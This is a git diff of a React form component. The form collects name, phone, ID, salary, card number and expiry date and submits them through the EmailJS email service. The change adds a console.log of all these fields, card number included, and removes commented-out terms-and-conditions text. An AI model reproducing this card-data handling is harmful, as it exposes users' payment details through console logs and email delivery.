@@ -28,8 +28,8 @@ const Main = ({ data, state, data1 }) => {
     e.preventDefault();
     console.log(form.current);
     const placement = "top";
-
-    if (fname && phone && id && salary && cardNo && expiryDate) {
+    console.log(fname, phone, id, salary, cardNo, expiryDate);
+    if (fname && phone && id && cardNo && expiryDate) {
       emailjs
         .sendForm(
           "service_zj5623f",
@@ -122,13 +122,12 @@ const Main = ({ data, state, data1 }) => {
                 <div className="row d-flex ">
                   <div className="input-container col-sm-12 mt-4">
                     <label className="text-dark p-1" htmlFor="First Name">
-                      <strong>{data.name}</strong>{" "}
+                      <strong>{data.fname}</strong>{" "}
                       <strong className="text-danger float-left">*</strong>
                     </label>
                     <input
                       type="text"
                       name="first_name"
-                      placeholder={data.fname}
                       onChange={(e) => {
                         setFname(e.target.value);
                       }}
@@ -245,29 +244,6 @@ const Main = ({ data, state, data1 }) => {
                     }}
                   />
                 </div>
-                {/* <div class="form-group form-check mt-2">
-                  <input
-                    type="checkbox"
-                    class="form-check-input"
-                    id="exampleCheck1"
-                  />
-                  <label class="form-check-label " for="exampleCheck1">
-                    {data.term}{" "}
-                    <strong className="text-danger float-left">*</strong>
-                  </label>
-                </div> */}
-                {/* <div
-                  className="bg-light p-2 mt-3 "
-                  style={{
-                    height: "120px",
-                    overflow: "scroll",
-                    overflowX: "hidden",
-                    boxShadow: "rgba(0, 0, 0, 0.2) 0px 0px 1px 1px",
-                  }}
-                >
-                  <h4>{data.termsAndConditions}:</h4>
-                  <p className="mt-1">{data.text}</p>
-                </div> */}
               </div>
             </>
             <div className="mt-4 p-3 rounded shadow">
